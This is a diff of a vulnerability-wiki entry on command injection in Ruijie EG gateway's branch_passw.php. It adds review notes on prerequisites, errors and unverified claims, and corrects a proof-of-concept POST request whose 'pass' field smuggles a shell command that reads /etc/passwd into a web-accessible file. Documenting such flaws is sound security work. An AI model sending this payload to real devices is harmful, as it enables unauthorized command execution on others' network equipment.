@@ -1,9 +1,57 @@
 ---
 version: "锐捷EG易网关"
 source: "Threekiii/Vulnerability-Wiki"
+id: "vw-383b828f117876acb3aa8a8f"
+entity_id: "ve-383b828f117876acb3aa8a8f"
+schema_version: "1"
+title: "锐捷 EG易网关 branch_passw.php 远程命令执行"
+product: "Ruijie EG易网关"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+identifier_role: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+prerequisites: "已登录或先成功泄露管理员密码；版本未列"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7-EG%E6%98%93%E7%BD%91%E5%85%B3-branch_passw.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md"
+review_date: "2026-10-02"
+side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
+source_status: "unknown"
 ---
 
 # 锐捷 EG易网关 branch_passw.php 远程命令执行
+
+<!-- article-review:devices:begin -->
+## 技术校订与证据边界（2026-10-02）
+
+- 产品/组件：Ruijie EG易网关
+- 本文讨论：branch_passw.php set pass命令注入，login.php泄露作为前置链
+- 版本、权限与配置前提：已登录或先成功泄露管理员密码；版本未列
+- 资料类型：源码审计/链式PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果
+
+### 逐项校订
+
+- 手动请求/etc/psswd拼写错误，脚本为/etc/passwd
+- evpnShell实现不在片段，无过滤结论仍需查看helper；listAction另有拼接但不是当前PoC
+- 登录成功以status/1子串、正则解析str(headers)脆弱，凭据未编码；写test_test.txt有残留且静态文件可能误报
+- 不能将前置login.php漏洞与后台branch入口合成一个免认证根因
+- 已落实的文本修订：“/etc/psswd”改为“/etc/passwd”；HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
+- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
+
+### 操作风险与恢复
+
+- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据
+
+### 待核与来源
+
+- 父控制器/evpnShell权限、固件和修复待核
+- 引用图片未查看，截图内容及有效性待核验
+- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
+- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
+<!-- article-review:devices:end -->
+
 
 ## 漏洞描述
 
@@ -131,17 +179,17 @@ include_once dirname(dirname(__FILE__)) . '/init.php';     //mvc架构初始化
 
 发送请求包
 
-```plain
+```http
 POST /itbox_pi/branch_passw.php?a=set HTTP/1.1
 Host: 
 User-Agent: Go-http-client/1.1
 Content-Length: 41
 Content-Type: application/x-www-form-urlencoded
-Cookie: RUIJIEID=52222egp72ilkpf2de7qbrigk3;user=admin;
+Cookie: RUIJIEID=522********************gk3;user=admin;
 X-Requested-With: XMLHttpRequest
 Accept-Encoding: gzip
 
-pass=|cat /etc/psswd>../test_test.txt
+pass=|cat /etc/passwd>../test_test.txt
 ```
 
 再访问
